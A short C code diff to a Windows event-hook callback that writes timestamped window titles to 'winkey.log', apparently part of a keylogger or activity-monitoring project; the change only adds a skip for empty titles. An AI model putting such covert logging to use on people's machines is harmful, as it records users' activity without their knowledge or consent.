@@ -35,10 +35,10 @@ void Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idOb
 	char* title = LocalAlloc(LMEM_ZEROINIT, len);
 	FILE* flog = 0;
 
-	if (!title) return ;
+	if (!title) return;
 	GetSystemTime(&st);
 	GetWindowText(hwnd, title, len);
-
+	if (!*title) return;
 	fopen_s(&flog, "winkey.log", "a");
 	fprintf_s(flog, "\n[%02d.%02d.%d %02d:%02d:%02d] - %s\n", st.wDay, st.wMonth, st.wYear,
 		st.wHour, st.wMinute, st.wSecond, title);
